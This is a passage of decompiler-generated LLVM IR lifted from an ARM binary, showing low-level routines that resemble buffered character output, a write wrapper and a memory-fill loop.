  %v3_f000 = zext i16 %v2_f000 to i32
  store i32 %v3_f000, i32* %r3.global-to-local, align 4
  %v1_f004 = and i32 %v3_f000, 8
  %v2_f004 = icmp eq i32 %v1_f004, 0
  store i1 %v2_f004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f004, label %dec_label_pc_f024, label %dec_label_pc_f034

dec_label_pc_f018:                                ; preds = %dec_label_pc_efec
  %v1_f010 = trunc i32 %v3_eff0 to i8
  %v2_f010 = load i32, i32* @r5, align 4
  %v3_f010 = inttoptr i32 %v2_f010 to i8*
  store i8 %v1_f010, i8* %v3_f010, align 1
  %v4_f010 = load i32, i32* @r5, align 4
  %v5_f010 = add i32 %v4_f010, 1
  store i32 %v5_f010, i32* @r5, align 4
  %v0_f014 = load i32, i32* %r3.global-to-local, align 4
  %v2_f014 = icmp ugt i32 %v0_f014, 9
  store i1 %v2_f014, i1* %cpsr_c.global-to-local, align 1
  %v7_f014 = icmp eq i32 %v0_f014, 10
  store i1 %v7_f014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f014, label %dec_label_pc_f024, label %dec_label_pc_f01c.backedge

dec_label_pc_f01c.backedge:                       ; preds = %dec_label_pc_f018, %dec_label_pc_efd8
  %v0_f01c = load i32, i32* %r6.global-to-local, align 4
  %v1_f01c = add i32 %v0_f01c, -1
  store i32 %v1_f01c, i32* %r6.global-to-local, align 4
  %v2_f01c = icmp ne i32 %v0_f01c, 0
  store i1 %v2_f01c, i1* %cpsr_c.global-to-local, align 1
  %v7_f01c = icmp eq i32 %v0_f01c, 1
  store i1 %v7_f01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f01c, label %dec_label_pc_f024, label %dec_label_pc_f01c.backedge.dec_label_pc_efc8_crit_edge

dec_label_pc_f01c.backedge.dec_label_pc_efc8_crit_edge: ; preds = %dec_label_pc_f01c.backedge
  %v0_efc8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_efc8

dec_label_pc_f024:                                ; preds = %dec_label_pc_f018, %dec_label_pc_f01c.backedge, %dec_label_pc_efd8, %dec_label_pc_f01c.preheader, %dec_label_pc_f000
  %v0_f024 = load i32, i32* @r5, align 4
  %v1_f024 = load i32, i32* @r7, align 4
  %v3_f024 = icmp uge i32 %v0_f024, %v1_f024
  store i1 %v3_f024, i1* %cpsr_c.global-to-local, align 1
  %v9_f024 = icmp eq i32 %v0_f024, %v1_f024
  store i1 %v9_f024, i1* %cpsr_z.global-to-local, align 1
  %v2_f028 = xor i1 %v9_f024, true
  %v3_f028 = and i1 %v3_f024, %v2_f028
  br i1 %v3_f028, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_f024
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_f02c = inttoptr i32 %v0_f024 to i8*
  store i8 0, i8* %v7_f02c, align 1
  %v0_f030.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f030.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_f024, %bb
  %v1_f030 = phi i1 [ %v1_f030.pre, %bb ], [ %v9_f024, %dec_label_pc_f024 ]
  %v0_f030 = phi i1 [ %v0_f030.pre, %bb ], [ %v3_f024, %dec_label_pc_f024 ]
  %v2_f030 = xor i1 %v1_f030, true
  %v3_f030 = and i1 %v0_f030, %v2_f030
  br i1 %v3_f030, label %.dec_label_pc_f038_crit_edge, label %dec_label_pc_f034

.dec_label_pc_f038_crit_edge:                     ; preds = %.thread14
  %v0_f038.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f038

dec_label_pc_f034:                                ; preds = %dec_label_pc_efa8, %dec_label_pc_f000, %.thread14
  br label %dec_label_pc_f038

dec_label_pc_f038:                                ; preds = %.dec_label_pc_f038_crit_edge, %dec_label_pc_f034
  %v0_f038 = phi i32 [ %v0_f038.pre, %.dec_label_pc_f038_crit_edge ], [ 0, %dec_label_pc_f034 ]
  store i32 %v6_efa8, i32* @r5, align 4
  ret i32 %v0_f038

; uselistorder directives
  uselistorder i1 %v9_f024, { 1, 0, 2 }
  uselistorder i32 %v1_f024, { 1, 0 }
  uselistorder i32 %v0_f024, { 0, 2, 1 }
  uselistorder i32 %v0_f01c, { 2, 0, 1 }
  uselistorder i32 %v0_f014, { 1, 0 }
  uselistorder i32 %v3_eff0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_efe0, { 1, 0 }
  uselistorder i32 %v3_efc8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_efec, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_f038, { 1, 0 }
  uselistorder label %dec_label_pc_f034, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_f024, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_efc8, { 1, 0 }
}

define i32 @function_f048(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f048:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp6 = sext i8 %arg1 to i32
  store i32 %tmp6, i32* %r0.global-to-local, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_f048 = load i32, i32* @r4, align 4
  store i32 %v3_f048, i32* %stack_var_-12, align 4
  %v6_f048 = load i32, i32* @r5, align 4
  %v2_f04c = add i32 %arg2, 16
  %v3_f04c = inttoptr i32 %v2_f04c to i32*
  %v4_f04c = load i32, i32* %v3_f04c, align 4
  store i32 %v4_f04c, i32* %r2.global-to-local, align 4
  %v2_f050 = add i32 %arg2, 28
  %v3_f050 = inttoptr i32 %v2_f050 to i32*
  %v4_f050 = load i32, i32* %v3_f050, align 4
  store i32 %v4_f050, i32* %r3.global-to-local, align 4
  %v3_f054 = icmp uge i32 %v4_f04c, %v4_f050
  store i1 %v3_f054, i1* %cpsr_c.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_f060 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f060, i32* @r5, align 4
  br i1 %v3_f054, label %dec_label_pc_f078, label %.thread

.thread:                                          ; preds = %dec_label_pc_f048
  %v2_f064 = urem i32 %v0_f060, 256
  store i32 %v2_f064, i32* %r3.global-to-local, align 4
  %v2_f068 = trunc i32 %v0_f060 to i8
  %v4_f068 = inttoptr i32 %v4_f04c to i8*
  store i8 %v2_f068, i8* %v4_f068, align 1
  %v5_f068 = load i32, i32* %r2.global-to-local, align 4
  %v6_f068 = add i32 %v5_f068, 1
  store i32 %v6_f068, i32* %r2.global-to-local, align 4
  %v0_f06c.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f06c.pr.pr, label %dec_label_pc_f078, label %.thread3

.thread3:                                         ; preds = %.thread
  %v1_f06c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_f06c, i32* %r0.global-to-local, align 4
  store i32 %v6_f068, i32* %v3_f04c, align 4
  br label %dec_label_pc_f144

dec_label_pc_f078:                                ; preds = %dec_label_pc_f048, %.thread
  %v3_f078 = load i16, i16* %tmp, align 2
  %v4_f078 = zext i16 %v3_f078 to i32
  %v1_f07c = and i32 %v4_f078, 192
  store i32 %v1_f07c, i32* %r3.global-to-local, align 4
  %v2_f080 = icmp eq i32 %v1_f07c, 192
  store i1 %v2_f080, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_f080, label %dec_label_pc_f09c, label %dec_label_pc_f088

dec_label_pc_f088:                                ; preds = %dec_label_pc_f078
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_f090 = call i32 @function_132bc(i16* nonnull %tmp, i32 128)
  store i32 %v4_f090, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f094 = icmp eq i32 %v4_f090, 0
  br i1 %v2_f094, label %dec_label_pc_f09c, label %dec_label_pc_f140

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f088, %dec_label_pc_f078
  %v0_f09c = load i32, i32* @r4, align 4
  %v1_f09c = add i32 %v0_f09c, 4
  %v2_f09c = inttoptr i32 %v1_f09c to i32*
  %v3_f09c = load i32, i32* %v2_f09c, align 4
  store i32 %v3_f09c, i32* %r3.global-to-local, align 4
  %v2_f0a0 = icmp ugt i32 %v3_f09c, -3
  store i1 %v2_f0a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0a0 = icmp eq i32 %v3_f09c, -2
  br i1 %v7_f0a0, label %dec_label_pc_f138, label %dec_label_pc_f0a8

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_f09c
  %v1_f0a8 = add i32 %v0_f09c, 12
  %v2_f0a8 = inttoptr i32 %v1_f0a8 to i32*
  %v3_f0a8 = load i32, i32* %v2_f0a8, align 4
  store i32 %v3_f0a8, i32* %r2.global-to-local, align 4
  %v1_f0ac = add i32 %v0_f09c, 8
  %v2_f0ac = inttoptr i32 %v1_f0ac to i32*
  %v3_f0ac = load i32, i32* %v2_f0ac, align 4
  store i32 %v3_f0ac, i32* %r3.global-to-local, align 4
  %v3_f0b0 = icmp uge i32 %v3_f0a8, %v3_f0ac
  store i1 %v3_f0b0, i1* %cpsr_c.global-to-local, align 1
  %v9_f0b0 = icmp eq i32 %v3_f0a8, %v3_f0ac
  br i1 %v9_f0b0, label %dec_label_pc_f11c, label %dec_label_pc_f0b8

dec_label_pc_f0b8:                                ; preds = %dec_label_pc_f0a8
  %v1_f0b8 = add i32 %v0_f09c, 16
  %v2_f0b8 = inttoptr i32 %v1_f0b8 to i32*
  %v3_f0b8 = load i32, i32* %v2_f0b8, align 4
  store i32 %v3_f0b8, i32* %r3.global-to-local, align 4
  %v3_f0bc = icmp uge i32 %v3_f0a8, %v3_f0b8
  store i1 %v3_f0bc, i1* %cpsr_c.global-to-local, align 1
  %v9_f0bc = icmp eq i32 %v3_f0a8, %v3_f0b8
  br i1 %v9_f0bc, label %dec_label_pc_f0c4, label %dec_label_pc_f0d4

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_f0b8
  store i32 %v0_f09c, i32* @r0, align 4
  %v0_f0c8 = call i32 @function_d978()
  store i32 %v0_f0c8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0cc = icmp eq i32 %v0_f0c8, 0
  br i1 %v2_f0cc, label %dec_label_pc_f0c4.dec_label_pc_f0d4_crit_edge, label %dec_label_pc_f140

dec_label_pc_f0c4.dec_label_pc_f0d4_crit_edge:    ; preds = %dec_label_pc_f0c4
  %v0_f0d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f0d4

dec_label_pc_f0d4:                                ; preds = %dec_label_pc_f0c4.dec_label_pc_f0d4_crit_edge, %dec_label_pc_f0b8
  %v0_f0d4 = phi i32 [ %v0_f0d4.pre, %dec_label_pc_f0c4.dec_label_pc_f0d4_crit_edge ], [ %v0_f09c, %dec_label_pc_f0b8 ]
  %v1_f0d4 = add i32 %v0_f0d4, 16
  %v2_f0d4 = inttoptr i32 %v1_f0d4 to i32*
  %v3_f0d4 = load i32, i32* %v2_f0d4, align 4
  store i32 %v3_f0d4, i32* %r2.global-to-local, align 4
  %v0_f0d8 = load i32, i32* @r5, align 4
  %v1_f0d8 = urem i32 %v0_f0d8, 256
  store i32 %v1_f0d8, i32* %r1.global-to-local, align 4
  %v1_f0dc = trunc i32 %v0_f0d8 to i8
  %v3_f0dc = inttoptr i32 %v3_f0d4 to i8*
  store i8 %v1_f0dc, i8* %v3_f0dc, align 1
  %v4_f0dc = load i32, i32* %r2.global-to-local, align 4
  %v5_f0dc = add i32 %v4_f0dc, 1
  store i32 %v5_f0dc, i32* %r2.global-to-local, align 4
  %v0_f0e0 = load i32, i32* @r4, align 4
  %v1_f0e0 = inttoptr i32 %v0_f0e0 to i16*
  %v2_f0e0 = load i16, i16* %v1_f0e0, align 2
  %v3_f0e0 = zext i16 %v2_f0e0 to i32
  store i32 %v3_f0e0, i32* %r3.global-to-local, align 4
  %v1_f0e4 = and i32 %v3_f0e0, 256
  %v2_f0e4 = icmp eq i32 %v1_f0e4, 0
  %v2_f0e8 = add i32 %v0_f0e0, 16
  %v3_f0e8 = inttoptr i32 %v2_f0e8 to i32*
  store i32 %v5_f0dc, i32* %v3_f0e8, align 4
  br i1 %v2_f0e4, label %dec_label_pc_f138, label %dec_label_pc_f0f0

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f0d4
  %v0_f0f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_f0f0 = icmp ugt i32 %v0_f0f0, 9
  store i1 %v2_f0f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f0 = icmp eq i32 %v0_f0f0, 10
  br i1 %v7_f0f0, label %dec_label_pc_f0f8, label %dec_label_pc_f138

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0f0
  %v0_f0f8 = load i32, i32* @r4, align 4
  store i32 %v0_f0f8, i32* @r0, align 4
  %v0_f0fc = call i32 @function_d978()
  store i32 %v0_f0fc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f100 = icmp eq i32 %v0_f0fc, 0
  br i1 %v2_f100, label %dec_label_pc_f138, label %dec_label_pc_f108

dec_label_pc_f108:                                ; preds = %dec_label_pc_f0f8
  %v0_f108 = load i32, i32* @r4, align 4
  %v1_f108 = add i32 %v0_f108, 16
  %v2_f108 = inttoptr i32 %v1_f108 to i32*
  %v3_f108 = load i32, i32* %v2_f108, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_f110 = add i32 %v3_f108, -1
  store i32 %v1_f110, i32* %r3.global-to-local, align 4
  store i32 %v1_f110, i32* %v2_f108, align 4
  br label %dec_label_pc_f144

dec_label_pc_f11c:                                ; preds = %dec_label_pc_f0a8
  %v0_f120 = load i32, i32* @r5, align 4
  %v6_f120 = trunc i32 %v0_f120 to i8
  store i8 %v6_f120, i8* %stack_var_-17, align 1
  %v9_f120 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v9_f120, i32* %r1.global-to-local, align 4
  %v1_f124 = inttoptr i32 %v0_f09c to i16*
  store i32 %v0_f09c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_f12c = call i32 @function_130c8(i16* %v1_f124, i32 %v9_f120, i32 1)
  store i32 %v5_f12c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f130 = icmp eq i32 %v5_f12c, 0
  br i1 %v2_f130, label %dec_label_pc_f140, label %dec_label_pc_f138

dec_label_pc_f138:                                ; preds = %dec_label_pc_f0f0, %dec_label_pc_f11c, %dec_label_pc_f0f8, %dec_label_pc_f0d4, %dec_label_pc_f09c
  %v0_f138 = load i32, i32* @r5, align 4
  %v1_f138 = urem i32 %v0_f138, 256
  store i32 %v1_f138, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f144

dec_label_pc_f140:                                ; preds = %dec_label_pc_f0c4, %dec_label_pc_f088, %dec_label_pc_f11c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f144

dec_label_pc_f144:                                ; preds = %.thread3, %dec_label_pc_f138, %dec_label_pc_f108, %dec_label_pc_f140
  %v2_f148 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f148, i32* @r4, align 4
  store i32 %v6_f048, i32* @r5, align 4
  %v1_f14c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_f14c

; uselistorder directives
  uselistorder i32 %v0_f0f0, { 1, 0 }
  uselistorder i32 %v0_f0d8, { 1, 0 }
  uselistorder i32 %v0_f09c, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %v0_f060, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 3, 4, 7, 5, 6, 8, 9, 2, 10, 12, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_f144, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_f140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f138, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_f078, { 1, 0 }
}

define i32 @function_f150(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f150:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f150 = load i32, i32* @r4, align 4
  store i32 %v3_f150, i32* %stack_var_-16, align 4
  %v6_f150 = load i32, i32* @r5, align 4
  %v9_f150 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f15c = call i32 @function_f2e0()
  store i32 %v0_f15c, i32* @r6, align 4
  %v0_f164 = load i32, i32* @r5, align 4
  %v0_f168 = load i32, i32* @r4, align 4
  %v4_f174 = inttoptr i32 %v0_f164 to i16*
  %v5_f174 = call i32 @function_f188(i32 %v0_f168, i32 1, i32 %v0_f15c, i16* %v4_f174)
  %v1_f178 = load i32, i32* @r6, align 4
  %v9_f178 = icmp eq i32 %v5_f174, %v1_f178
  br i1 %v9_f178, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_f150
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_f150, %bb
  %v1_f184 = phi i32 [ %v5_f174, %dec_label_pc_f150 ], [ -1, %bb ]
  %v2_f180 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f180, i32* @r4, align 4
  store i32 %v6_f150, i32* @r5, align 4
  store i32 %v9_f150, i32* @r6, align 4
  ret i32 %v1_f184

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_f188(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
dec_label_pc_f188:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_f188 = load i32, i32* @r6, align 4
  %v12_f188 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_f190 = load i16, i16* %arg4, align 2
  %v1_f194 = and i16 %v3_f190, 192
  %v2_f198 = icmp eq i16 %v1_f194, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_f198, label %dec_label_pc_f1c4, label %dec_label_pc_f1b0

dec_label_pc_f1b0:                                ; preds = %dec_label_pc_f188
  %v4_f1b8 = call i32 @function_132bc(i16* nonnull %arg4, i32 128)
  %v2_f1bc = icmp eq i32 %v4_f1b8, 0
  br i1 %v2_f1bc, label %dec_label_pc_f1c4thread-pre-split, label %dec_label_pc_f224

dec_label_pc_f1c4thread-pre-split:                ; preds = %dec_label_pc_f1b0
  %v0_f1c4.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_f1c4

dec_label_pc_f1c4:                                ; preds = %dec_label_pc_f1c4thread-pre-split, %dec_label_pc_f188
  %v0_f1d4 = phi i32 [ %v0_f1c4.pr, %dec_label_pc_f1c4thread-pre-split ], [ %arg2, %dec_label_pc_f188 ]
  %v2_f1c4 = icmp eq i32 %v0_f1d4, 0
  br i1 %v2_f1c4, label %dec_label_pc_f224, label %bb

bb:                                               ; preds = %dec_label_pc_f1c4
  %v1_f1c8 = load i32, i32* @r6, align 4
  %v3_f1c8 = icmp eq i32 %v1_f1c8, 0
  br i1 %v3_f1c8, label %dec_label_pc_f224, label %dec_label_pc_f1d0

dec_label_pc_f1d0:                                ; preds = %bb
  store i32 -1, i32* @r0, align 4
  store i32 %v0_f1d4, i32* @r1, align 4
  %v0_f1d8 = call i32 @function_c960()
  %v0_f1dc = load i32, i32* @r6, align 4
  %tmp9 = icmp ugt i32 %v0_f1dc, %v0_f1d8
  %v0_f204 = load i32, i32* @r5, align 4
  %v1_f204 = inttoptr i32 %v0_f204 to i16*
  br i1 %tmp9, label %dec_label_pc_f204, label %dec_label_pc_f1e4

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f1d0
  store i32 %v0_f204, i32* %r2.global-to-local, align 4
  %v0_f1e8 = load i32, i32* @r4, align 4
  %v2_f1e8 = mul i32 %v0_f1e8, %v0_f1dc
  %v0_f1ec = load i32, i32* @r7, align 4
  %v5_f1f0 = call i32 @function_1317c(i32 %v0_f1ec, i32 %v2_f1e8, i16* %v1_f204)
  store i32 %v5_f1f0, i32* @r0, align 4
  %v0_f1f4 = load i32, i32* @r4, align 4
  store i32 %v0_f1f4, i32* @r1, align 4
  %v0_f1f8 = call i32 @function_c960()
  store i32 %v0_f1f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f228

dec_label_pc_f204:                                ; preds = %dec_label_pc_f1d0
  %v2_f204 = load i16, i16* %v1_f204, align 2
  %v1_f208 = or i16 %v2_f204, 8
  store i16 %v1_f208, i16* %v1_f204, align 2
  %v0_f210 = call i32 @function_ce08()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_f21c = inttoptr i32 %v0_f210 to i32*
  store i32 22, i32* %v2_f21c, align 4
  %v0_f228.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f228

dec_label_pc_f224:                                ; preds = %dec_label_pc_f1c4, %dec_label_pc_f1b0, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f228

dec_label_pc_f228:                                ; preds = %dec_label_pc_f204, %dec_label_pc_f1e4, %dec_label_pc_f224
  %v0_f228 = phi i32 [ %v0_f228.pre, %dec_label_pc_f204 ], [ %v0_f1f8, %dec_label_pc_f1e4 ], [ 0, %dec_label_pc_f224 ]
  store i32 %v9_f188, i32* @r6, align 4
  store i32 %v12_f188, i32* @r7, align 4
  ret i32 %v0_f228

; uselistorder directives
  uselistorder i16* %v1_f204, { 0, 2, 1 }
  uselistorder i32 %v0_f1dc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @function_1317c, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_f228, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f224, { 2, 0, 1 }
}

define i32 @function_f238(i32 %arg1) local_unnamed_addr {
dec_label_pc_f238:
  ret i32 %arg1
}

define i32 @function_f240(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f240:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_f244 = load i32, i32* @r2, align 4
  %v8_f244 = icmp eq i32 %v0_f244, 8
  store i1 %v8_f244, i1* %cpsr_z.global-to-local, align 1
  %v5_f248 = icmp slt i32 %v0_f244, 8
  br i1 %v5_f248, label %dec_label_pc_f2a8, label %dec_label_pc_f24c

dec_label_pc_f24c:                                ; preds = %dec_label_pc_f240
  %v4_f24c = mul i32 %arg2, 256
  %v5_f24c = or i32 %v4_f24c, %arg2
  %v4_f250 = mul i32 %v5_f24c, 65536
  %v5_f250 = or i32 %v4_f250, %v5_f24c
  store i32 %v5_f250, i32* %r1.global-to-local, align 4
  %v1_f25457 = urem i32 %tmp, 4
  %v2_f25458 = icmp eq i32 %v1_f25457, 0
  store i1 %v2_f25458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_f25458, label %dec_label_pc_f264, label %bb

bb:                                               ; preds = %dec_label_pc_f24c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_f24c ]
  %v3_f25859 = phi i32 [ %v6_f258, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_f24c ]
  %v4_f258 = inttoptr i32 %v3_f25859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_f258, align 1
  %v5_f258 = load i32, i32* @r3, align 4
  %v6_f258 = add i32 %v5_f258, 1
  store i32 %v6_f258, i32* @r3, align 4
  %v0_f25c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_f268.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_f25c.pr, label %dec_label_pc_f264, label %.thread

.thread:                                          ; preds = %bb
  %v2_f25c = add i32 %v0_f268.pr.pre, -1
  store i32 %v2_f25c, i32* @r2, align 4
  %v1_f254 = urem i32 %v6_f258, 4
  %v2_f254 = icmp eq i32 %v1_f254, 0
  store i1 %v2_f254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f254, label %dec_label_pc_f264, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_f258.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_f258.pre to i8
  br label %bb

dec_label_pc_f264:                                ; preds = %.thread, %bb, %dec_label_pc_f24c
  %v0_f27028 = phi i32 [ %tmp, %dec_label_pc_f24c ], [ %v6_f258, %bb ], [ %v6_f258, %.thread ]
  %v0_f268.pr = phi i32 [ %v0_f244, %dec_label_pc_f24c ], [ %v0_f268.pr.pre, %bb ], [ %v2_f25c, %.thread ]
  %v0_f264 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_f264, i32* @ip, align 4
  %v8_f26810 = icmp eq i32 %v0_f268.pr, 8
  store i1 %v8_f26810, i1* %cpsr_z.global-to-local, align 1
  %v5_f26c11 = icmp slt i32 %v0_f268.pr, 8
  br i1 %v5_f26c11, label %dec_label_pc_f2a8, label %dec_label_pc_f270.preheader

dec_label_pc_f270.preheader:                      ; preds = %dec_label_pc_f264
  %v1_f27046 = inttoptr i32 %v0_f27028 to i32*
  store i32 %v0_f264, i32* %v1_f27046, align 4
  %v3_f27047 = add i32 %v0_f27028, 4
  %v4_f27048 = inttoptr i32 %v3_f27047 to i32*
  %v5_f27049 = load i32, i32* @ip, align 4
  store i32 %v5_f27049, i32* %v4_f27048, align 4
  %v6_f27050 = add i32 %v0_f27028, 8
  store i32 %v6_f27050, i32* @r3, align 4
  %v0_f27451 = load i32, i32* @r2, align 4
  %v1_f27452 = add i32 %v0_f27451, -8
  store i32 %v1_f27452, i32* %r2.global-to-local, align 4
  %v5_f27c53 = icmp slt i32 %v1_f27452, 8
  br i1 %v5_f27c53, label %dec_label_pc_f270.dec_label_pc_f2a8.loopexit_crit_edge, label %dec_label_pc_f280

dec_label_pc_f280:                                ; preds = %dec_label_pc_f270.preheader, %dec_label_pc_f268.dec_label_pc_f270_crit_edge
  %v6_f27055 = phi i32 [ %v6_f270, %dec_label_pc_f268.dec_label_pc_f270_crit_edge ], [ %v6_f27050, %dec_label_pc_f270.preheader ]
  %v0_f27054 = phi i32 [ %v12_f29c, %dec_label_pc_f268.dec_label_pc_f270_crit_edge ], [ %v0_f27028, %dec_label_pc_f270.preheader ]
  %v1_f280 = inttoptr i32 %v6_f27055 to i32*
  %v2_f280 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_f280, i32* %v1_f280, align 4
  %v3_f280 = add i32 %v0_f27054, 12
  %v4_f280 = inttoptr i32 %v3_f280 to i32*
  %v5_f280 = load i32, i32* @ip, align 4
  store i32 %v5_f280, i32* %v4_f280, align 4
  %v6_f280 = add i32 %v0_f27054, 16
  store i32 %v6_f280, i32* @r3, align 4
  %v0_f284 = load i32, i32* %r2.global-to-local, align 4
  %v1_f284 = add i32 %v0_f284, -8
  store i32 %v1_f284, i32* %r2.global-to-local, align 4
  %v5_f28c = icmp slt i32 %v1_f284, 8
  br i1 %v5_f28c, label %dec_label_pc_f280.dec_label_pc_f2a8.loopexit_crit_edge, label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %dec_label_pc_f280
  %v1_f290 = inttoptr i32 %v6_f280 to i32*
  %v2_f290 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_f290, i32* %v1_f290, align 4
  %v3_f290 = add i32 %v0_f27054, 20
  %v4_f290 = inttoptr i32 %v3_f290 to i32*
  %v5_f290 = load i32, i32* @ip, align 4
  store i32 %v5_f290, i32* %v4_f290, align 4
  %v6_f290 = add i32 %v0_f27054, 24
  store i32 %v6_f290, i32* @r3, align 4
  %v0_f294 = load i32, i32* %r2.global-to-local, align 4
  %v1_f294 = add i32 %v0_f294, -8
  store i32 %v1_f294, i32* %r2.global-to-local, align 4
  %v5_f29c = icmp slt i32 %v1_f294, 8
  br i1 %v5_f29c, label %dec_label_pc_f290.dec_label_pc_f2a8.loopexit_crit_edge, label %dec_label_pc_f268

dec_label_pc_f268:                                ; preds = %dec_label_pc_f290
  %v7_f29c = inttoptr i32 %v6_f290 to i32*
  %v8_f29c = load i32, i32* %r1.global-to-local, align 4
